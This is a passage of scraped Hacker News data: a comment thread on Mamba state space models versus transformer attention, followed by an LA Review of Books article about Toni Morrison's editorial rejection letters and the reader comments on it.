performance boost. But... look at where we got with \"naive\" attention. GPT 4, Claude 3. It's not like we're hitting a wall with quadratic attention. It's absurdly more expensive than SSMs, but GPUs certainly aren't getting slower. If all AI work stops now, and only hardware improves, it wouldn't be long until GPT4 could run on local hardware, right, provided Moore's law? /end rant, not really sure what my point was, I'm not against SSMs (they're cool) but rather I'm wondering if the SOTA will ever be SSM when attention is so damn good reply anon291 6 hours agoparentYes transformers are obviously more capable than humans in my opinion. Claude can ingest dozens of pages in seconds and -- in a single shot -- write a summary bringing in relevant passages. The innovation is not the speed, but the lack of recursion or iteration. Humans, even accomplished ones, have to reread sections and really 'internalize' ideas before being able to summarize and very few humans can -- in a single attempt -- generate perfect speech. Most of us speak and unknowingly revise our own speech as we go along. Unlike transformers, that speak confidently, we start making a sentence and then decide halfway through its not going where we like. Then we start it over again, and by the powers of human attention, no one seems to really notice. Transformers Are just insanely complicated and expensive to train. reply rdedev 4 hours agorootparentI view transformers as like the language center of the brain. When we write or speak, especially when it's critical to get things right, we have this ability to think \"that doesn't make sense\" and start over. I view this recursion as more of a strength than weakness. You can get an LLM to generate an answer and when asked about the validity of the answer it would acknowledge that it got it wrong. This begs the question that if it had perfect recall and understanding why did it give the wrong answer in the first place? I don't know how the reasoning part comes to us but if we could implant that capability to a transformer model then it would end up pretty good. reply jazzyjackson 5 hours agorootparentprev> we start making a sentence and then decide halfway through its not going where we like I'll just add the observation that when we do this it's largely based on feedback receive from the recipient (well, so long as you're talking-with as opposed to talking-at) - we're paying attention to how the audience is paying attention or not, any small facial tics that might betray skepticism or agreement and so on. I'm looking forward to interacting with an LLM that pairs an emotion-vector along with each token it has previously produced. hume.ai goes a long way analyzing audio, just a matter of time before they're ingesting realtime facial cues to also incorporate their audience's reaction in their choice of what to say next reply koayon 8 hours agoparentprevThis is a very fair point! If we had infinite compute then it's undeniable that transformers (i.e. full attention) would be better (exactly as you characterise it) But that's the efficiency-effectiveness tradeoff that we have to make: given that compute is limited, would we prefer attention over shorter sequences or SSMs over longer sequences? The answer is probably \"well, it depends on your use case\" - I can definitely see reasons for both! A fairly compelling thought for me is hybrid architectures (Jamba is a recent one). Here you can imagine having perfect recall over recent tokens and lossy recall over distant tokens. E.g. if the AI is generating a feature-length film, you \"could imagine having Attention look at the most recent frames for short-term fluidity and an SSM for long-term narrative consistency\" (quote from the OP) reply rdedev 4 hours agorootparentIf I remember it right, the llm big bird had something like this. For a particular word it would attend strongly with its closer neighbours but weakly to words far from it. Look for sparse attention. I think that's the relevant terminology. Not sure if it matches exactly what you described reply koayon 8 hours agorootparentprevAnd given that the compute is O(n^2) with context window, it's a very real tradeoff, at least in the short term reply thomasahle 9 hours agoparentprev>> But Transformers have one core problem. In a transformer, every token can look back at every previous token when making predictions. > Lately I've been wondering... is this a problem, or a strength? Exactly. There are lot of use cases where perfect recall is important. And earlier data may be more or less incompressible, such as if an LLM is working on a large table of data. Maybe we'll end up with different architectures being used for different applications. E.g. simple chat may be OK with an RNN type architecture. I've also seen people combine Mamba and Transformer layers. Maybe that's a good tradeoff for some other applications. reply maccam912 15 hours agoparentprevIt depends on the task I imagine. Like writing a novel was mentioned, keeping important story lines in your memory for a long time will be necessary, or at least certainly more important than remembering what the characters were eating for lunch on page 10. But if you need to find that one loophole in a contact you probably will benefit from the perfect recall. reply y42 13 hours agoparentprev>> Is this a problem or a strength? I was wondering the same thing. I understand, why the initial developers of this method declared it as a strength. Still I think it's a problem, too: If the Tranformer reads this sentence: A equals B It understands, that B comes after A and therefore A equals B. But how does it learn that after A comes B and therefore B equals A. I am referring to the logical problems, that most (all?) modern language models suffer of. reply sigmoid10 12 hours agorootparentI see many people get confused by this due to the widely spread (and false) \"stochastic parrot\" theme. But these models are much more than mere senzence-repeaters. In a way, the model is not learning that after A comes B. I mean, it could. With a lack of additional training data it probably would, too. But with enough data, this kind of sentence completion based purely on existing sentences no longer works because it would saturate parameters. So to retain and improve accuracy during training, it will have to come up with a compression that essentially forms a model of the real world. Or at least the world that the training corpus describes [1]. In that sense, it no longer \"knows\" that B comes after A (except for the input context), but it would have learned that there is a special relation between A and B. In can then also apply this kind of learned logic to new concepts that appear first in the context during inference. With all that happening internally, it only has to morph this state back into a natural language output. But with billions of parameters and countless layers, there is more than enough computational room for this to happen. In fact, recent models have shown that even small models can get pretty good at logic if you only get the training data right. [1] https://arxiv.org/abs/2210.13382 reply metadat 2 hours agoparentprevWhat's an SSM? For the uninitiated (like me), apparently it stands for State Space Models. reply aCoreyJ 14 hours agoparentprevWe're running out of the ability to make transistors smaller and closer together so beyond some major breakthrough I wouldnt expect Moore's law to continue nearly long enough to get to the point of running GPT4 on consumer hardware in the short term reply timschmidt 12 hours agorootparentAh, but we've just begun stacking transistors in the third dimension. reply ctrw 9 hours agorootparentThat doesn't solve the problem, it just pushes is down the road a bit. The exponential growth is merely offset by a constant factor once. Unless we figure out how to push transistors in the 5th, 6th etc dimension with every new generation. reply jazzyjackson 5 hours agorootparentprevIt was never a solution, Moore's law has more than one dimension as well, not just density but heat dissipation. Can't cool down a transistor that's surrounded by transistors on all sides. reply nlrk 8 hours agoparentprev>> When you are speaking, each time you emit a word, you are not attending to every previous word in your sentence I was exactly doing this until late in my youth. until I learnt people do it sequentially. But it is doable to create connections and pick the sensible case. Not the most relaxing thing. reply tippytippytango 12 hours agoparentprevIt's a tradeoff to be managed depending on the application rather than a problem. reply spxneo 15 hours agoparentprevvery good point and the sooner we can accept this difference (we access hyperdimensional entities we discover through language and math via fast and slow access and vocalize it through the alphabets we learned to read) the more \"intelligence\" we can unlock from AI. reply logicchains 2 hours agoparentprev>Lately I've been wondering... is this a problem, or a strength? It's a strength; fundamentally it's impossible to achieve the same degree of accuracy with a sub-quadratic attention mechanism: https://arxiv.org/abs/2209.04881 (unless the Strong Exponential Time Hypothesis is false, which is very unlikely, like P=NP). reply incrudible 12 hours agoparentprev> It's not like we're hitting a wall with quadratic attention. It's absurdly more expensive than SSMs, but GPUs certainly aren't getting slower. We are not hitting a wall, but a slope. Hardware improvements will not make up for it indefinitely. Software will have to make up for it, but the problem is that it costs millions of dollars to hit compile. reply etbebl 14 hours agoprevAnyone else keep seeing articles about Mamba and thinking it's about Python/Conda? It's annoying when the new cool thing picks the same name as something else you like that deserves attention. reply tempaccount420 3 hours agoparentSounds like you need a language model to help you categorize Mamba articles into Python and non-Python articles? reply ragebol 13 hours agoparentprev> attention I see what you did there reply password4321 15 hours agoprevLinks to more about Mamba (selective state space models) on HN yesterday: https://news.ycombinator.com/item?id=39853958#39855430 reply fisian 4 hours agoparentThis submission has the same content as the link here (submitted to HN about a month ago): https://news.ycombinator.com/item?id=39501982 https://www.kolaayonrinde.com/blog/2024/02/11/mamba.html reply jimmySixDOF 2 hours agorootparentYes and its the same author this time published on the Gradient (the link before was to the personal blog). The Gradient by the way are amazing curators of AI news in general and have one of the better podcasts I am aware of interviewing developers in the trenches. Adding: this resurgence in Mamba in general is also due to some actual sota progress with SSM like the new AI21 lab released this week [1] and likely to see others merging different architecture layers (this is a 52B MoE with 12B params active during inference blending both Mamba and transformers) >As the first production-grade model based on Mamba architecture, Jamba achieves an unprecedented 3X throughput and fits 140K context on a single GPU. [1] https://www.ai21.com/jamba reply xz18r 16 hours agoprevI just have to say it: that image shows gunpla, i.e. Mobile Suit Gundam, not Transformers! reply throwup238 16 hours agoparentAn official request has been made to ICANN to rescind the OP's nerd card. reply programjames 14 hours agoprevThis is the best explanation I have seen for Mamba. reply spxneo 14 hours agoparentTLDR: Friendship ended with transformers. Now Mamba is my best friend. reply sp332 13 hours agoprevSo in an effective Mamba query the question goes at the end, after input data? I thought that the question should go at the beginning, so it can decide which information in the data is relevant. reply eropple 7 hours agoparentI could be wrong, as I haven't used Mamba, but it seems to remain similar to transformers in that it doesn't \"decide\" anything and streams tokens to follow the existing ones; attention isn't a thing in the same way, but recency does still have impact. To that end, putting context after the question makes it more likely to follow the context, not the question. reply jongjong 7 hours agoprev [–] I find it difficult to understand certain math and science papers/articles due to ambiguous use of language. For example \"all previous tokens can be passed to the current token.\" That seems like a poorly constructed sentence. A token is not a function and it's not an algorithm either... How can you pass tokens to a token? This type of ambiguous language in academic papers makes it hard to read... Maybe the phrase 'every token has an association with every other previously encountered token' would be better? Or every token is used to compute the token vector for each token... I don't know, all I can do is guess the meaning of the word 'passed'. They want us to infer and fill in the gaps with our own assumptions. It assumes that we are primed to think in a certain highly constrained way... For some reason a lot of academia around AI is littered with such imprecise language. They choose to use niche concepts and repurposed wording that their own small community invented rather using words and ideas that are more widely understood but which would convey the same information. Rational people who aren't directly involved in those fields who generally resist jumping to conclusions will struggle to understand what is meant because a lot of those words and ideas have different interpretations in their own fields. I studied machine learning at university and wrote ANNs from scratch and trained them and even I find the language and concepts around LLMs too ambiguous. I'd rather just ask ChatGPT. One thing that bothers me is that the community has moved away from relating concepts to neurons, interconnections, input layers, hidden layers and output layers. Instead, they jump straight into vectors and matrices... Pretending as though there is only one way to map those calculations to neurons and weights. But in fact, this abstraction has many possible interpretations. You could have fully connected layers or partially connected layers... Maybe you need a transformer only in front of the input layer or between every layer... So many possibilities. The entire article means little if considered in isolation outside of the context of current configurations of various popular frameworks and tools. reply derbOac 6 hours agoparentI agree although I've always interpreted it as a combination of difficulty explaining complex architecture, and also not really understanding why things work the way they do. A lot of modern AI sits in this kind of quasi-empirical realm just above (in an emergent properties sense) analytic math and statistics, and it seems like there's not a very good integrative account or understanding of what's going on, or a way of deriving what direction to go in. So you end up with poor explanations in part because the authors of the structures themselves don't quite understand why things are working as they are. reply king_magic 7 hours agoparentprev [–] that's not what it says in the article. it actually says \"information from all previous tokens can be passed to the current token\". that statement is meaningfully different from \"all previous tokens can be passed to the current token\". and both really makes sense if you understand attention mechanisms. reply jongjong 6 hours agorootparent [–] Sorry for the misquote but it's a distraction from my issue which was with the usage of the word 'passed'. Do you pass information from other tokens to a token in the sense that each token processes information from other tokens? A token isn't a processing unit AFAIK, it's just a word part. The processing is not the responsibility of the token itself. My understanding is that tokens may be associated with each other via an external structure but not passed to each other. Or maybe they meant a token vector? And the token vector contains information from related tokens? It's unclear. To me, 'passed' means data passed to a function or algorithm for processing. It's confusing unless a token is a function or algorithm. My point is that this language only makes sense if you are already up to date in that field. reply anon291 6 hours agorootparent [–] Well they gave the equations so follow closely where the token representations end up and how they're acted upon. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Mamba is a State Space Model (SSM) presented as a proficient substitute for Transformers in managing long sequences, with Control Theory-driven dynamics and selective memory for enhanced modeling.",
      "It provides quicker inference, linear scalability concerning sequence length, and data compression into the state, along with in-context learning and retrieval augmented generation for improved information recall and utilization.",
      "The article explores Mamba's potential across diverse applications and the evolving realm of sequence modeling post-Transformers."
    ],
    "commentSummary": [
      "Transformers are known for higher accuracy but are complex and expensive to train compared to SSMs, which are considered more human-like in language modeling.",
      "The debate revolves around the future of language modeling, touching on attention mechanisms, emotion vectors, and the impact of hardware constraints.",
      "Discussions also cover issues like confusion between programming languages and AI models, vague language in academic papers, and interpreting information flow among tokens in algorithms."
    ],
    "points": 138,
    "commentCount": 38,
    "retryCount": 0,
    "time": 1711814693
  },
  {
    "id": 39877949,
    "title": "Toni Morrison's Constructive Rejection Letters",
    "originLink": "https://lareviewofbooks.org/article/there-is-no-point-in-my-being-other-than-honest-with-you-on-toni-morrisons-rejection-letters/",
    "originBody": "There Is No Point in My Being Other Than Honest with You: On Toni Morrison’s Rejection Letters By Melina MoeMarch 26, 2024 “I FOUND IT extremely honest, forthright, and moving in ways I had not expected it to be,” Toni Morrison wrote to an aspiring novelist in 1977, “but it is a shuddering book and one that offers no escape for any reader whatsoever.” Still, Morrison, then a senior editor at Random House, liked the manuscript so much that, before responding, she passed it around the office to drum up support. The verdict was “intelligent,” but also “very ‘down,’ depressing, spiritually abrasive.” Whatever the merits of the writing, Morrison’s colleagues predicted, the potent mix of dissatisfaction, anger, and mournfulness would limit the book’s commercial appeal—and Morrison reluctantly agreed. “You don’t want to escape and I don’t want to escape,” her letter concludes, “but perhaps the public does and perhaps we are in the business of helping them do that.” During her 16 years at Random House, Morrison wrote hundreds of rejection letters. Usually typed on pink, yellow, or white carbonless copy paper, and occasionally bearing Random House’s old logo and letterhead, these are now filed among her correspondence in the Random House archives at Columbia University’s Rare Book & Manuscript Library. While many of the letters were mailed to New York, Boston, and even Rome, others were sent to writers in more obscure places; some are addressed to “general delivery” in various small towns across the United States. Regardless of destination, Morrison’s rejections tend to be long, generous in their suggestions, and direct in their criticism. The letters themselves—generally one, two at most, exchanged with a given writer—constitute an asymmetrical archive. On one end of each communiqué is the ghost of a submitted manuscript (absent from the archive after being returned to the sender, although in some cases survived by a cover letter). On the other is a rejection from Morrison, sometimes brusque yet typically offering something more than an expression of disinterest—notes on craft, character development, the need for more (or less) drama. But also: Autopsies of a changing, and in many ways diminishing, publishing industry; frustrations with the tastes of a reading public; and sympathies for poets, short story writers, and other authors drawn to commercially hopeless genres. ¤ Most of Morrison’s surviving rejection letters date to the 1970s, a period that saw rapid changes in New York book publishing. This was especially true at Random House: a decade after going public in 1959, the company used the influx of cash to fuel a wave of acquisitions and two mergers, purchasing Alfred A. Knopf and Then, in 1965, Random House itself was acquired by RCA, an electronics company, only to be sold a few years later to a media conglomerate owned by the Newhouse family. Under this aegis, Random House went on to acquire a slew of imprints that expanded the company’s global footprint and generic range. In short, like Pangaea breaking up in reverse, the publishing industry underwent the dramatic, global consolidation that produced today’s “Big Five”: Simon & Schuster, Penguin Random House, HarperCollins, Hachette Book Group, and Macmillan. Recently, this would have shrunk to the Big Four had an attempt by the German media conglomerate Bertelsmann (owner of Penguin Random House, the largest US publisher) to buy Simon & Schuster from its parent company, ViacomCBS, not been blocked by a US federal judge on antitrust grounds. Assistant Attorney General Jonathan Kanter celebrated the collapse of the deal, claiming: “The proposed merger would have reduced competition, decreased author compensation, diminished the breadth, depth, and diversity of our stories and ideas, and ultimately impoverished our democracy.” Kanter’s statement may seem grandiose, but the underlying anxiety is and was real; Morrison herself voiced similar concerns 40 years earlier. In her 1981 keynote speech at the American Writers Congress, she warned that the business had already tipped too far away from the work of writers and editors, so that “the vitality in the arts which promoters like to talk about is false. Beneath the headlines of blockbusters and bestsellers, underneath the froth of the book fairs,” she averred, “something is terribly wrong.” It’s perhaps unsurprising that the conditions of for-profit cultural production tend to reward the precisely honed, predictable commodity. Literary scholar Dan Sinykin recently argued that the conglomerate era in publishing has transformed the fictional works that get acquired, published, and placed (strategically) on store shelves. “Conglomerate fiction,” which is often genre fiction—that is, more or less easily labeled as mystery, romance, or science fiction—is less distinguishable by its formal characteristics than by its origins within a “conglomerate superorganism” of marketers, acquisitions editors, dust-jacket designers, and many others whose jobs are on the line and therefore have a stake in a given book’s success. The shift hasn’t been unique to fiction. If the conglomerate era produced corporate authors, the studio system churned out Hollywood blockbusters, while creative writing programs shaped a distinctly reflexive MFA style. Even so, Morrison’s warning about the state of publishing in 1981 didn’t advocate a return to the solitary, romantic toiler. Instead, her keynote address called for movement building: “We don’t need any more writers as solitary heroes. We need a heroic writers movement—assertive, militant, pugnacious.” ¤ Morrison’s letters are unexpectedly forthcoming. Often, she supplements her rejections with diagnoses of an ailing publishing business, growing frustrations with unimaginative taste, the industry’s aversion to risk-taking, and her own sense of creative constraint working at a commercial press (especially in the late 1970s and early ’80s; Morrison left editorial work to be a full-time novelist in the early 1980s). They sketch a “road not taken” in mainstream publishing, as experimental volumes, poetry, and short story collections were increasingly treated as suspect investments of editorial time and publishing house resources. Current market conditions made for “a losing proposition for the publisher and a hopeless one for short story writers,” Morrison informed one author, and unless they were penned by famous novelists, short story collections were “almost like the publication of poetry”—that is, “practically impossible to make a profit from.” In another, lengthy letter from 1977, Morrison outlined how the economics of a book project depended on the mechanisms of distribution. It wasn’t just that casual readers didn’t buy short story collections, but that the major institutions responsible for generating widespread enthusiasm and name recognition were also uninterested: “Book clubs do not make offers for collections of short stories; mass paperback houses do not make offers for collections of short stories by single authors and so we are left with the hope that ten or fifteen thousand people will go into a bookstore and ask for a particular author by name.” The rejection concludes with Morrison’s admission that “[t]here is no point in my being other than honest with you, you should continue to publish in magazines and if you ever decide to write a novel, I’d be delighted to look at it.” With other projects, Morrison tried to tap into available marketing networks. She wrote to Good Housekeeping in the hopes they would select Lucille Clifton’s Generations (1976) for their book club, as well as to dozens of Black cultural organizations to see if they would organize reading clubs for Angela Davis’s autobiography. Despite being met with middling success, these campaigns—as well as Morrison’s work on the genre-bending Black Book (1974)—fueled an increase in queries from West Coast, experimental voices. Morrison was humane even with the most hopeless of proposals, like those she received from aspiring crossover academics. In 1978, Morrison told a Berkeley professor that the “commercial requirements of Random House are such that literary research and criticism does not figure in its plans.” Still, Morrison’s letter suggests that she’d read the entire manuscript, providing suggestions and the consolation that “unless you have some very ‘hip’ (and probably inaccurate) sociological view to tag on to the literary criticism, it is received with very little enthusiasm.” Similarly, Morrison wrote an apologetic note to Wayne Daniels and Ishmael Reed after passing on a Yardbird reader in 1974, explaining that “the financial crisis that has swept the country has now gripped everybody in publishing and any project on which there is a modicum of risk is heavily discouraged.” She nonetheless offered to “do whatever [she could] to promote it,” asking for copies she could use to “generate some enthusiasm on this coast.” Morrison was keenly aware that the publishing world, like other areas of business, is a place where it helps to have friends and connections, industry contacts and people who may owe you (or someone you know) a favor. To that end, she occasionally ended a rejection by offering her name as a kind of passport with which hopeful authors might navigate the borders erected by other cultural gatekeepers. In 1977, she advised one young writer to find an agent and directed him toward the legendary literary agents Georges Borchardt and Peter Matson, adding, “When you write to them you may say that although I could not take your manuscript myself, I was very much in love with it, and I’m willing to put it in writing.” She pointed another young radical in the direction of Jules Geller, a former colleague of Morrison’s who went on to work at the Monthly Review, and sent yet another to Charles Harris—a Black editor who overlapped with Morrison briefly at Random House before leaving to become a founding editor at Howard University Press. Even in her rejections, Morrison was building a network of Black writers and editors who might, one day, work to redraw the contours of commercial publishing. ¤ Above all else, Morrison’s rejection letters focus on craft—that is, on the experience of reading a work under review. In one 1978 rejection of a modern Western, she wrote that “it simply wasn’t interesting enough—the excitement, the ‘gut’s, just weren’t there. I am returning it to you herewith.” This sustained desire to explain her rejections elicits a decades-long, fragmentary discourse on style, on how to advance a plot, on when a manuscript’s structure needs to be more unexpected, or—more commonly—on when it needs to be simplified. Readers are needy creatures, Morrison’s letters suggest, demanding both drama and organization, the space and information to make discoveries themselves yet a clear enough path so as not to feel lost. In 1975, she described one manuscript as “put together in a way that made it difficult to enjoy. The scenes are too short and packed too tightly. Motives were lacking.” She forestalled any possible rejoinders about the virtues of avant-garde abstraction by professing her awareness that “the subject itself is about disorder and confusion” but maintaining that “the book should create order for the reader, to help him understand more than simply what happened. He needs to know why.” In other words: Attempts to capture the condition of modern life are no excuse for leaving readers miserable, directionless, or bored. Editorial advice often boils down to show don’t tell, and literary critics like Ted Underwood, Andrew Piper, and Sinykin have argued that the language of sensory and embodied perception sets fiction apart from other genres, like biography. Morrison’s letters often bear this out. In 1979, she informed one writer that their “story is certainly worth telling,” but they “describe people and events from a distance instead of dramatizing them, developing scenes in which the reader discovers what kind of people they are instead of being told.” Vivid scenery and precise details offer readers room to maneuver, a way to discover a world that resonates. A couple of months earlier, she gave similar advice to a young Bebe Moore Campbell (who went on to become a best-selling author). And, addressing one colorful character who had evidently dropped by the Random House offices unannounced to pitch their memoir, Morrison warned about conflating an eventful life with a well-crafted story. “Your manuscript was no less interesting than you were,” she noted; however, to make it publishable, “you would have to add the artifice (or art) that you said you decidedly would not do.” What Morrison repeatedly stressed, trusting her exceptional acuity as both a reader and writer, is that writing is a skill of its own—one that doesn’t automatically follow from intellectual brilliance, nor from simply being an interesting or important person. She told one young writer that his ideas were good, but warned that concept was the first and lowest hurdle he would face: Your work needs force—some manner of making these potentially powerful characters alive and of giving texture to the setting. Giving details about the people—more than what they look like—what idiosyncrasies they have, what distinguished mannerism—and details about where the action takes place: what is in the room, what is the light like, the smells, etc.—all of that would give us texture and tone. Characteristically, this detailed rejection ends with encouragement, as Morrison told the author, “I hope you are able to work on [your manuscript] to give it the vitality it certainly deserves.” ¤ Morrison left Random House in 1983. In the years leading up to her departure, she sought to make more time for her own writing by commuting to the office only once a week. Yet she continued to read unsolicited submissions. She apologized to one author for responding almost a year after her manuscript landed on her desk. (She found the submission “messy and disjointed” and had “no idea what or where a novel might be,” but nevertheless concluded that “there is such power and grit and a funny kind of lyricism that I have to tell you to try to make something of it”—and instructed the author to send it back to her when she had.) To an unpublished writer from South Webster, Ohio, Morrison observed that “there is a great deal of vitality in your writing and a freshness that is welcoming,” though, she warned, “it needs a lot of work with structure and dialog.” Even so, she promised to “give the entire manuscript a reading” if he finished. Remarkably, this was an offer Morrison extended repeatedly, to unpublished, unknown writers—some of whom had sent only a handful of what she believed to be promising pages. Unsurprisingly, her rejection notes are a practiced repertoire of graceful ways to say “no” and “goodbye”: “Enclosed herewith”; “I decline”; “Please accept my genuine regrets”; “Best of luck”; “With regards and regrets.” But they’re an archive of Morrison’s faith in and sheer love for the written word—and of her kindness. Throughout her career, Morrison balanced her literary commitments, her commercial responsibilities, and her concerns about the industry overall. The increasing friction between these likely contributed to her eventual decision to leave publishing entirely. Morrison’s rejection letters represent perhaps her clearest articulation of this tension, often for the benefit of young authors who had no claim on her attention other than throwing a piece of writing over the Random House transom. Such writers, she warned, faced uphill battles to get their words into print. “The material is interesting,” she concluded in one letter, “but not the writing: it needs a lot of work to give it the energy a story must have.” ¤ Featured image: Alfio Giuffrida, Wandtöpfe A-exp11, 2020, is licensed under CC BY-SA 3.0 Deed by the creator. Accessed February 26, 2024. LARB Contributor Melina Moe is the curator of literature at Columbia University’s Rare Book & Manuscript Library. Share Copy link to article LARB Staff Recommendations On Excavating the Novel and “Toni Morrison: Sites of Memory” Jasmine Liu visits Princeton University Library’s exhibition of Toni Morrison’s archive. Jasmine LiuMay 6, 2023 Toni Morrison’s Big Bang The primal wound of slavery in Toni Morrison’s fiction. Clifford ThompsonFeb 1, 2019 Fiction Did you know LARB is a reader-supported nonprofit? LARB publishes daily without a paywall as part of our mission to make rigorous, incisive, and engaging writing on every aspect of literature, culture, and the arts freely accessible to the public. Help us continue this work with your tax-deductible donation today! Donate",
    "commentLink": "https://news.ycombinator.com/item?id=39877949",
    "commentBody": "Toni Morrison's Rejection Letters (lareviewofbooks.org)132 points by blegh 14 hours agohidepastfavorite51 comments grepLeigh 5 hours ago\"On the other is a rejection from Morrison, sometimes brusque yet typically offering something more than an expression of disinterest—notes on craft, character development, the need for more (or less) drama. But also: Autopsies of a changing, and in many ways diminishing, publishing industry; frustrations with the tastes of a reading public; and sympathies for poets, short story writers, and other authors drawn to commercially hopeless genres.\" This is a beautiful way to soften the blow of rejection and turn it into an opportunity for growth. I wish the modern tech equivalent of a rejection letter could include the same kindness (\"Thank you for your interest ... We regret to inform you ... After careful consideration, we are not moving forward\"). I've managed/founded, so I fully understand how much liability this opens the company up to, but I still mourn the loss of this small kindness. reply rtpg 2 hours agoparentI've been on the receiving end of \"thoughtful\" rejection letters. Some have been helpful, but some really served to cement the subjectivity of the whole thing. The \"funniest\" one is one where I in fact knew the person who got the job. I received a nice and long rejection letter explaining all the points they found off for me. I was too aloof during the interview process itself (thinking I was a good fit), and many of the points mentioned were not wrong. But I knew for a fact that I was better than the person who got the job on all the mentioned points[0]! There was one thing not mentioned, a pure \"culture fit\" component[1]. Pretty sure that was a decisive factor, but not mentioned. It just felt like something where, if I didn't have the full context, I would have really bogged myself down from \"wrong\" feedback. And when feedback can involve innate parts of one's personality, from people who have already decided to not work with you, it can be painful. [0]: I worked closely with this person for many years. I do not have ill will towards them, the skill gap I'm mentioning was purely a \"years of experience\" thing IMO [1]: for the curious: the place hired loads of people in a certain community, of which ~all of them were from the British Isles. I am not. reply maroonblazer 9 hours agoprevI was hoping for a link to all of her rejection letters but alas, none is provided. I guess we have to visit the Random House archives at Columbia University’s Rare Book & Manuscript Library. reply hyperthesis 4 hours agoprev> show don’t tell [...] she informed one writer that their “story is certainly worth telling,” but they “describe people and events from a distance instead of dramatizing them, developing scenes in which the reader discovers what kind of people they are instead of being told.” The second part of the quote (from \"developing...\") seems to be saying tell don't show. Is the quote mangled or I am misparsing? reply LeonB 3 hours agoparentI think I see how you’re interpreting the sentence. Imagine instead the word “and” in place of the comma before “developing”. The letter writers wants the author to be “dramatising (their events) AND developing scenes in which the reader…” reply hyperthesis 1 hour agorootparentThanks, I think you're right. It seems weird to have a parallel structure where the roles are swapped - but Toni Morrison would know better than me! Maybe it works better in the original context. To see the context, I think I'd have to visit the \"Random House archives at Columbia University’s Rare Book & Manuscript Library\", though they do have a website: https://library.columbia.edu/libraries/rbml.html reply qyph 3 hours agoparentprevYou have it precisely backwards. \"Developing scenes in which the reader discovers what kind of people they are\" is synonymous with \"show\" and \"being told\" is literally a form of \"tell.\" reply hyperthesis 1 hour agorootparentThe quote is introduced with \"but\", and the first part is the other way around (\"...distance instead of dramatizing...\"). reply ngcc_hk 1 hour agoprevIs the gatekeeper function is diminished a bit by electronic publishing ? reply ByQuyzzy 7 hours agoprev [–] I was forced to read her book in school, I didn't care for it. One wonders what percentage of her readers read her willingly. reply presbyterian 7 hours agoparentShe’s a winner of the Nobel Prize in Literature, National Book Critics Circle Award, Pulitzer Prize for Fiction, Presidential Medal of Freedom, and the National Book Foundation’s Medal of Distinguished Contribution to American Letters; one of the most celebrated writers in American literature. I understand that you may not personally like the book of hers you read, but to suggest that people read her just because they’re required to is absurd. reply halayli 3 hours agorootparentNot taking sides but this is argument from authority fallacy. Whether she is a Nobel Prize winner or not is irrelevant to answering OP's comment and whether her books are page turners or majority find them uninteresting. reply ryanjshaw 3 hours agorootparentAll you have to do is go on Rotten Tomatoes and compare the professional critic's rating with the audience rating. If your preferences generally align with professional critics, you are in the minority as far as I can tell - at least for movies. I wouldn't be surprised if the same is true for books, vindicating OP, but I don't know of an appropriate data source that could settle this. reply dustyleary 1 hour agorootparentI thought it was considered \"well known\" that the Rotten Tomatoes audience rating is not trustworthy because of ballot stuffing by the film studios. reply Ma8ee 57 minutes agorootparentprevThe two groups looks for very different things in the media. One care deeply about it and appreciates many different aspects of it, and sometimes the intellectual challenge is part of it. They are utterly bored by most books and films. The other group wants to relax and be entertained, not solve an intellectual puzzle. Many are somewhere in between. I don’t care about an odyssey through some neo-Marxist mystery, but are utterly bored by Marvel iteration 25. reply Out_of_Characte 6 hours agorootparentprev>but to suggest that people read her just because they’re required to is absurd Its not, source: the OP Your comment made me realise how much I hated being required to read X because of all the exact reasons you mentioned above. Just because what I've read didn't win a nobel prize doesn't mean I cant find it subjectively better. reply chucksmash 2 hours agorootparentWhen I was a kid, to me no book was subjectively better than the Star Wars Expanded Universe (now \"Legends\") novels. I've never read anything from Toni Morrison but my life is richer for having been made to read outside the niche I chose for myself. You can discount awards and the opinions of professionals but there is still value in being exposed to things you wouldn't have picked on your own during your formative years. Maybe most of it leaves you cold, but sometimes you find something you would not have picked that speaks to you. That's how I was introduced to my favorite author. You never know what will land a little differently than you would have expected. Sometimes the classics are classics for a reason. reply Out_of_Characte 2 hours agorootparentYeah, I used to be very adverse to such things, I still am, in part because I know just how impossible it is to read something you dont believe and get an understanding of the material at the same time. It requires suspension of disbelief. anyone can have an open mind sometimes, but no one can do that all the time. For some concrete examples I would implore you to read excerpts from 'Ageless Body, Timeless Mind' by deepak chopra. To put it mildly, I know I have my limits. Required reading material is usually more mundane than some of the stuff out there. But that could also mean that it's not daring enough to require reading. So my philosophy is that you should support people in choosing their adversity, never mandating. reply bombcar 5 hours agorootparentprevFrom what I can determine, the books that kids are forced to read in high school are the books that their elders really loved; and often were not forced to read in high school. Most every book I was forced to read I still hate enough that I'll never bother rereading it. I'm sure they're all great; they also weren't for me, not at that time. Which is why the absolute last thing I'd ever do is assign anyone to read any of the books I love. reply prisenco 5 hours agorootparentI find that I generally love most of the books I was forced to read. Even if I didn’t at the time. I make time to re-read Grapes of Wrath once every decade and I connect with it differently every time I do. Catcher in the Rye has also taken new meaning as I’ve aged to where I can imagine Holden as my troubled, disaffected teenage son. I hated Romeo and Juliet as a teenager because everyone saw it as a beautiful romance and I thought I was so smart recognizing it as a cautionary tale of the impulsiveness of youth. But now I see it as a beautiful love story. I’m grateful that I was forced to read these as a young teenager because now I can reflect on these works and my reaction to them as a reflection of my own life. reply ggm 2 hours agorootparentprevPeople feel like this about a lot of Nobel authors. Patrick White won, I've never finished any book of his after \"a fringe of leaves\" and Thomas Mann just bored me to tears. To the other side, the ones i loved, Hermann Hesse was un-putdownable. Likewise Doris Lessing. A lot of people dislike Lessings writing style. So.. it's all about what you like. But I'd take writing advice from Ms Morrison seriously. reply defrost 1 hour agorootparentMy questioning of Patrick White began with hearing that he wanted Ken Russell to direct a film based on Voss ... That seemed like an, ahhhhhh, interesting choice of auteur. reply sandspar 4 hours agorootparentprevAwards are a racket that perpetuate themselves by making money for a constellation of editors, magazines, and talk shows. They have little to do with talent and even less to do with readability. How many of the Academy Awards Best Picture nominees over the last five years has the average person watched and enjoyed? Book awards are even more out of touch. Also do you honestly think that winning the Presidential Medal of Freedom is an unbiased recommendation? It's a propaganda award. reply markoman 3 hours agorootparentI think you're going to have connect a lot more dots than that to prove that type of conspiracy. These awards are heralded year after year because of their reliability in giving people what they expect out of an award, whether they're forward looking (for predicting future success) or more backward-looking. There is some flexibility in how people judge deservedness for them. You can at least concede that when it comes to Toni Morrison, its not like she only won a couple of isolated awards. She won a long string of them, and is one of the most decorated American writers of the last 80 years. One of her books, Beloved, was made into a movie by Oprah. There are plans to make a second book (Sula) into a movie or series as well. reply Ekaros 1 hour agorootparentI don't think making movie out of a book tells anything either... Ofc, they will pick such works just because they can put 